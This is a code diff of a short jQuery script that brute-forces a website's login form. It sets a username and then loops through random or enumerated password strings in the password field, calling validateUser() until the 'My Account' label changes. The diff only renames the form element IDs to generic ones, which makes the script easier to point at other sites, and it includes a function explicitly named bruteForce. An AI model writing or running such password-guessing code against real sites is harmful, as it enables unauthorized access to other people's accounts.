@@ -1,15 +1,15 @@
-$('#userId1').val('XXXXXX')
+$('#ID1').val('XXXXXX')
 var chars = ["a","b","c","d","e","f","g","h","i","j,","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," ","9","R","K","S","A","Y","@"];
-while($('#logInUN').text() == "My Account"){
+while($('#ID3').text() == "My Account"){
   var len = Math.floor(Math.random() * 20);
   var str = "";
   while(str.length < len){
     str += chars[Math.floor(Math.random() * chars.length)];
   }
-  $("#userPass1").val(str);
+  $("#ID2").val(str);
 	validateUser();
 }
-$('#logInUN').text();
+$('#ID3').text();
 
 
 
@@ -43,12 +43,12 @@ var combinations = getCombinations(["a", "b", "c", "d", "e", "f", "g", "h", "i",
 	}
 
 	function bruteForce(input){
-	$('#userId1').val('XXXXXXX')
-	while($('#logInUN').text() == "My Account"){
-	  $("#userPass1").val(input);
+	$('#ID1').val('XXXXXXX')
+	while($('#ID3').text() == "My Account"){
+	  $("#ID2").val(input);
 		validateUser();
 	}
-	if($('#logInUN').text() != "My Account"){
+	if($('#ID3').text() != "My Account"){
 		$('#logInUN').text();
 
 	}
